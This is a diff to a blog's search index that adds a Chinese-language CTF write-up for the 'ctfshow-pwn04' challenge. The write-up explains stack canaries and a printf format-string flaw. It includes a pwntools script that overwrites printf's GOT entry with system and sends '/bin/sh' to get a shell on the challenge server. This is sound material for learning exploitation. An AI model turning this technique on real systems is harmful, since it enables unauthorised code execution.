@@ -1,6 +1,33 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ctfshow-pwn04</title>
+    <url>/%E6%A0%88%E6%BA%A2%E5%87%BA/ctfshow-pwn04/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>每日一题</p>
+<p><a href="https://sm.ms/image/OwtXnMP9d8Q5Y7b" target="_blank"><img src="https://s2.loli.net/2022/03/03/OwtXnMP9d8Q5Y7b.png" ></a></p>
+<span id="more"></span>
+
+<p><a href="https://sm.ms/image/E4IWBRjdNTx5lbr" target="_blank"><img src="https://s2.loli.net/2022/03/03/E4IWBRjdNTx5lbr.png" ></a></p>
+<p>打开了canary，栈不可执行。</p>
+<p>canary的原理是：在栈的ebp下面放一个随机数，<strong>在函数返回之前会检查这个数有没有被修改</strong>，就可以检测是否发生栈溢出了，因此 <code>在一个函数最后位置对ebp的操作，就是canary做的操作。</code></p>
+<h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p><a href="https://sm.ms/image/MbY1uErUikQ24Sp" target="_blank"><img src="https://s2.loli.net/2022/03/03/MbY1uErUikQ24Sp.png" ></a></p>
+<p>printf函数没有格式化输出，很好字符串格式化漏洞出来了。</p>
+<p>可以<strong>将printf函数的got表地址修改为system函数的内存地址</strong>，结果是当程序执行到printf函数时，其实是执行的system函数，而程序正好有两次输入输出，可以在第一次输入时篡改printf函数，到第二次输入时，我们只用传进去<code>/bin/sh</code>，那么程序在执行<code>printf(&amp;buf)</code>时，实际执行的却是<code>system(&#39;/bin/sh&#39;)</code>。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&quot;./ex2&quot;)</span></span><br><span class="line">sh = remote(<span class="string">b&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28110</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ex2&quot;</span>)</span><br><span class="line">printf = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf:system&#125;)</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;Hacker!\n&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&quot;/bin/sh\n&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<p><a href="https://sm.ms/image/d8O1v4lYbBSETgf" target="_blank"><img src="https://s2.loli.net/2022/03/03/d8O1v4lYbBSETgf.png" ></a></p>
+]]></content>
+      <categories>
+        <category>二进制安全</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>WP</tag>
+        <tag>栈溢出</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfshow-pwn03</title>
     <url>/%E6%A0%88%E6%BA%A2%E5%87%BA/ctfshow-pwn03/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又是一处新知识</p>
